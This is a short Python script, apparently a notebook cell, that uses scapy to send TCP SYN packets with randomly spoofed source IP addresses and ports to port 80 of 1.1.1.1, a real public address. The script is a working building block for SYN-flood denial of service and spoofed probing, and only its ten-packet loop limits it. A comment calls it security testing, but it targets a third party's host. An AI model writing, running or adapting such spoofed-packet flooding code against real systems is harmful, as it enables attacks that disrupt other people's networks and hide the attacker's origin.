```python
!pip install scapy
from scapy.all import IP, TCP, send
import random

def generate_random_ip():
    # Generate a randomized IPv4 address for source spoofing simulation
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

def send_ghost_packet(target_ip):
    # Randomize the source IP to simulate a distributed origin for each connection attempt
    src_ip = generate_random_ip()

    # Construct a TCP SYN packet (flag="S") with a randomized source port
    # targeting the standard HTTP port (80)
    packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=80, flags="S")

    print(f"[!] Sending spoofed packet from {src_ip} to {target_ip}...")
    send(packet, verbose=False)

# Target configuration for security testing/analysis
target = "1.1.1.1"
for _ in range(10):
    send_ghost_packet(target)
```
